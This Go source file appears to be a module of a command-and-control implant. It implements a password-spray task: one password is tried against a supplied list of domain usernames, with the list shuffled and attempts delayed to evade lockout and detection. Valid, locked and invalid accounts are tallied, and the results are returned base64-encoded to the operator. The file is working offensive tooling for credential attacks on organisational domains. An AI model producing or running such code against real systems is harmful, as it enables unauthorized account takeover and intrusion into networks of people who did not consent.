//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"runtime"
	"strings"
	"time"
)

type sprayResult struct {
	User   string `json:"user"`
	Status string `json:"status"` // valid, invalid, locked, disabled, expired, error
	Error  string `json:"error,omitempty"`
}

type sprayOutput struct {
	Results []sprayResult `json:"results"`
	Summary struct {
		Total   int `json:"total"`
		Valid   int `json:"valid"`
		Invalid int `json:"invalid"`
		Locked  int `json:"locked"`
		Errors  int `json:"errors"`
	} `json:"summary"`
}

func handlePasswordSpray(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 5)
	if len(parts) < 2 {
		res.Error = "format: password|domain|[dc_ip]|[delay_ms]"
		return
	}

	password := parts[0]
	domain := parts[1]
	dc := ""
	if len(parts) > 2 {
		dc = parts[2]
	}
	delayMs := 500
	if len(parts) > 3 && parts[3] != "" {
		fmt.Sscanf(parts[3], "%d", &delayMs)
	}

	rawUsers := strings.Split(strings.TrimSpace(task.Data), "\n")
	var users []string
	for _, u := range rawUsers {
		u = strings.TrimSpace(u)
		if u != "" {
			users = append(users, u)
		}
	}
	if len(users) == 0 {
		res.Error = "no usernames provided"
		return
	}

	rand.Shuffle(len(users), func(i, j int) { users[i], users[j] = users[j], users[i] })

	out := sprayOutput{}
	out.Summary.Total = len(users)

	for _, user := range users {
		status, errMsg := trySprayAuth(domain, user, password, dc)
		r := sprayResult{User: user, Status: status, Error: errMsg}
		out.Results = append(out.Results, r)

		switch status {
		case "valid":
			out.Summary.Valid++
		case "locked":
			out.Summary.Locked++
		default:
			if errMsg != "" && status != "invalid" {
				out.Summary.Errors++
			} else {
				out.Summary.Invalid++
			}
		}

		if delayMs > 0 && runtime.GOOS == "windows" {
			time.Sleep(time.Duration(delayMs) * time.Millisecond)
		}
	}

	jsonBytes, _ := json.Marshal(out)
	res.Output = base64.StdEncoding.EncodeToString(jsonBytes)
	res.Encoding = "base64"
}
